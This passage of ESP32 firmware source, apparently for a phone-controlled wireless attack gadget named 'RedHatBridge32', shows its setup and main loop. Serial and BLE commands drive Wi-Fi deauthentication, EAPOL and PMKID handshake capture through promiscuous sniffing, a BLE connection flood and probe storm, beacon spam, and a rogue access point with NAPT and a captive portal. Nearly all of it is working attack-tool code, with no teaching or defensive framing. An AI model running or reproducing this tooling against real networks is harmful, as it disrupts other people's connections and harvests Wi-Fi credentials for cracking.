}

// ============ setup ============
void setup() {
  Serial.begin(115200);
  delay(150);

  // BLE GATT (iPhone → ESP32)
  BLEDevice::init("RedHatBridge32");
  BLEDevice::setMTU(517);
  pServer = BLEDevice::createServer();
  pServer->setCallbacks(new SrvCb());
  BLEService *svc = pServer->createService(SERVICE_UUID);
  pChr = svc->createCharacteristic(CHR_UUID,
      BLECharacteristic::PROPERTY_READ |
      BLECharacteristic::PROPERTY_WRITE |
      BLECharacteristic::PROPERTY_WRITE_NR |
      BLECharacteristic::PROPERTY_NOTIFY);
  pChr->setCallbacks(new ChrCb());
  pChr->addDescriptor(new BLE2902());
  svc->start();

  BLEAdvertising *adv = BLEDevice::getAdvertising();
  adv->addServiceUUID(SERVICE_UUID);
  adv->setScanResponse(true);
  adv->setMinPreferred(0x06);
  adv->setMaxPreferred(0x12);
  BLEDevice::startAdvertising();

  // GATTC (Fase B): conn flood + ATT probe
  esp_ble_gattc_register_callback(bleGattcCb);
  esp_ble_gattc_app_register(0x42);

  // BT Classic (BR/EDR) — inquiry + SDP
  esp_bt_gap_register_callback(btGapCb);  esp_bt_gap_set_device_name("RedHatBridge32");
  esp_bt_gap_set_scan_mode(ESP_BT_NON_CONNECTABLE, ESP_BT_NON_DISCOVERABLE);

  // WiFi STA → hotspot iPhone (non bloccante: BLE subito disponibile)
  WiFi.persistent(false);
  WiFi.mode(WIFI_STA);
  {
    uint8_t mac[6] = {0};
    esp_wifi_get_mac(WIFI_IF_STA, mac);
    bool zero = true;
    for (int i = 0; i < 6; i++) if (mac[i]) zero = false;
    if (zero) {
      uint8_t m[6] = {0x02, 0x52, 0x48, 0x53, 0x00, 0x01};
      esp_wifi_set_mac(WIFI_IF_STA, m);
      Serial.println("[mac] era 00:00:00:00:00:00 → 02:52:48:53:00:01");
    } else {
      Serial.printf("[mac] STA %02X:%02X:%02X:%02X:%02X:%02X\n",
                    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    }
  }
  WiFi.setAutoReconnect(false);
  WiFi.onEvent([](WiFiEvent_t e, WiFiEventInfo_t info) {
    Serial.printf("[wifi] STA_DISCONNECTED reason=%d\n", (int)info.wifi_sta_disconnected.reason);
  }, ARDUINO_EVENT_WIFI_STA_DISCONNECTED);
  WiFi.onEvent([](WiFiEvent_t e, WiFiEventInfo_t info) {
    Serial.printf("[wifi] STA_CONNECTED ch=%d\n", (int)WiFi.channel());
  }, ARDUINO_EVENT_WIFI_STA_CONNECTED);
  // STA non si connette all'avvio: join solo su richiesta (evita di far
  // cadere l'hotspot iPhone con tentativi ripetuti). BLE subito disponibile.
  WiFi.setSleep(false);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_promiscuous_rx_cb(snifferCb);

  Serial.printf("[RHS-ESP32 v1.0] BLE GATT FFE0/FFE1 pronto — STA %s st=%d — heap=%d\n",
                STA_SSID, (int)WiFi.status(), ESP.getFreeHeap());
}

// ============ loop ============
void loop() {
  uint8_t b[64];
  int n;
  while ((n = ringPop(b, sizeof(b))) > 0) feedRx(b, n);

  pollScan();
  dnsTick();
  portalTick();
  joinTick();
  btTick();
  capTick();
  bleFloodTick();

  // smoke test seriale: S=start hop, R=start fisso, Q=stop, X=stats, D=dump sessioni
  static String serCmd;
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n' || c == '\r') {
      serCmd.trim();
      if (serCmd == "S") { Serial.printf("[cap] serial start=%d\n", capStart(true)); }
      else if (serCmd.startsWith("R")) {
        capForceCh = serCmd.length() > 1 ? serCmd.substring(1).toInt() : 0;
        bool okR = capStart(false);
        Serial.printf("[cap] serial fixed=%d force=%d\n", okR, capForceCh);
        capForceCh = 0;
      }
      else if (serCmd == "E") {
        int rc = capDeauth(6);
        Serial.printf("[cap] deauth bssid=%02X:%02X:%02X:%02X:%02X:%02X rc=%d tx=%lu\n",
                      capLastBssid[0], capLastBssid[1], capLastBssid[2],
                      capLastBssid[3], capLastBssid[4], capLastBssid[5], rc,
                      (unsigned long)capDeauthTx);
      }
      else if (serCmd == "F") {
        if (bleFloodOn) { bleFloodStop(); }
        else { bleFloodStart(true); }
        Serial.printf("[ble] flood=%d ticks=%lu\n", (int)bleFloodOn, (unsigned long)bleFloodTicks);
      }
      else if (serCmd == "G") {
        Serial.printf("[ble] gattcReady=%d if=%d conns=%d probeSent=%lu probeFail=%lu\n",
                      (int)bleGattcReady, (int)bleGattcIf, bleConnCount,
                      (unsigned long)bleProbeSent, (unsigned long)bleProbeFail);
      }
      else if (serCmd == "H") {
        bleFloodStop();
        Serial.println("[ble] storm stopped");
      }
      else if (serCmd == "C") {
        uint8_t m[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
        int rc = bleConnect(m, 1);
        Serial.printf("[ble] connect rc=%d conns=%d ready=%d\n", rc, bleConnCount, (int)bleGattcReady);
      }
      else if (serCmd == "T") {
        int s = bleAttProbe(4);
        Serial.printf("[ble] probe sent=%d conns=%d\n", s, bleConnCount);
      }
      else if (serCmd == "J") {
        WiFi.disconnect(false);
        delay(400);
        staWanted = true;
        staBeginPmf();
        for (int i = 0; i < 24; i++) {
          delay(500);
          int st = (int)WiFi.status();
          if (st == WL_CONNECTED) {
            Serial.printf("[join] ok i=%d ip=%s ch=%d rssi=%d bssid=%s\n", i,
                          WiFi.localIP().toString().c_str(), (int)WiFi.channel(),
                          (int)WiFi.RSSI(), WiFi.BSSIDstr().c_str());
            break;
          }
          if (i % 4 == 3) Serial.printf("[join] i=%d st=%d\n", i, st);
        }
        if (WiFi.status() != WL_CONNECTED)
          Serial.printf("[join] FAIL st=%d\n", (int)WiFi.status());
      }
      else if (serCmd == "L") {
        int n = WiFi.scanNetworks(false, true);
        Serial.printf("[scan] n=%d\n", n);
        for (int i = 0; i < n && i < 20; i++)
          Serial.printf("[scan] ssid=%s ch=%d rssi=%d auth=%d\n",
                        WiFi.SSID(i).c_str(), (int)WiFi.channel(i),
                        (int)WiFi.RSSI(i), (int)WiFi.encryptionType(i));
        WiFi.scanDelete();
      }
      else if (serCmd == "Q") { capStop(); }
      else if (serCmd == "I") {
        Serial.printf("[sta] status=%d ch=%d rssi=%d ip=%s capCh=%d on=%d\n",
                      (int)WiFi.status(), (int)WiFi.channel(), (int)WiFi.RSSI(),
                      WiFi.localIP().toString().c_str(), (int)capCh, (int)capOn);
      }
      else if (serCmd == "X") {
        uint8_t hwch = 0; wifi_second_chan_t sc = WIFI_SECOND_CHAN_NONE;
        esp_wifi_get_channel(&hwch, &sc);
        Serial.printf("[cap] frames=%lu eapol=%lu ses=%d ch=%d hwch=%d on=%d\n",
                      (unsigned long)capFrames, (unsigned long)capEapol, capSesCount, capCh, hwch, (int)capOn);
      } else if (serCmd == "D") {
        for (int i = 0; i < capSesCount; i++) {
          CapSes &s = capSes[i];
          Serial.printf("[cap] ses%d %02X:%02X:%02X:%02X:%02X:%02X sta %02X:%02X:%02X:%02X:%02X:%02X n=%d pmkid=%d ssid=%s\n",
                        i, s.bssid[0], s.bssid[1], s.bssid[2], s.bssid[3], s.bssid[4], s.bssid[5],
                        s.sta[0], s.sta[1], s.sta[2], s.sta[3], s.sta[4], s.sta[5],
                        s.n, (int)s.pmkid, s.ssid);
          for (int k = 0; k < s.n; k++)
            Serial.printf("[cap]   msg=%d len=%d ki=0x%04X\n", s.fr[k].msg, s.fr[k].len, s.fr[k].ki);
        }
      }
      serCmd = "";
    } else if (serCmd.length() < 8) {
      serCmd += c;
    }
  }

  if (joinPending) {
    if (WiFi.status() == WL_CONNECTED && WiFi.SSID() == joinTargetSsid) {
      joinPending = false;
      apChannel = (uint8_t)WiFi.channel();
      String ips = WiFi.localIP().toString();
      sendFrame(0x08, 0x00, (const uint8_t *)ips.c_str(), ips.length());
    } else if (millis() - joinStart > 15000) {
      joinPending = false;
      WiFi.disconnect(false);
      if (staWanted) staBeginPmf();
      sendFrame(0x08, 0x02, (const uint8_t *)"join failed", 11);
      Serial.println("[join] FAIL → reset STA_SSID");
    }
  }

  static uint32_t lastReconnect = 0;
  if (staWanted && !joinPending && !pmkidArmed && !beaconActive && !rogue && !scanPending && !capOn &&
      WiFi.status() != WL_CONNECTED && millis() - lastReconnect > 10000) {
    lastReconnect = millis();
    staBeginPmf();
  }
  if (WiFi.status() == WL_CONNECTED) {
    int ch = WiFi.channel();
    if (ch > 0 && !rogue && apChannel != (uint8_t)ch) apChannel = (uint8_t)ch;
  }
  if (rogue && WiFi.status() == WL_CONNECTED) {
    static uint32_t lastNapt = 0;
    if (millis() - lastNapt > 30000) {
      lastNapt = millis();
      if (!naptUp) naptOn();
    }
  }

  if (beaconActive) beaconLoop();

  if (pmkidArmed && (pmkidCaptured || millis() - pmkidStart > 25000)) {
    pmkidArmed = false;
    promiscOff();
    setChannel(apChannel);
    pmkidReturnAt = millis() + 3000;
    pmkidAwaitingReturn = true;
    Serial.println("[pmkid] return to AP channel");
  }

  if (pmkidAwaitingReturn && millis() >= pmkidReturnAt) {
    pmkidAwaitingReturn = false;
    if (pmkidCaptured) sendFrame(0x06, 0x00, pmkidBuf, pmkidLen);
    else sendFrame(0x06, 0x02, (const uint8_t *)"no eapol", 8);
  }

  if (sdpBusy && millis() - sdpStartMs > 15000) {
    sdpBusy = false;
    sendFrame(0x21, 0x02, (const uint8_t *)"sdp timeout", 11);
  }
  if (sdpDone) {
    sdpDone = false;
    sendFrame(0x21, (uint8_t)sdpStat, sdpBuf, sdpBufLen);
  }

  delay(1);
}
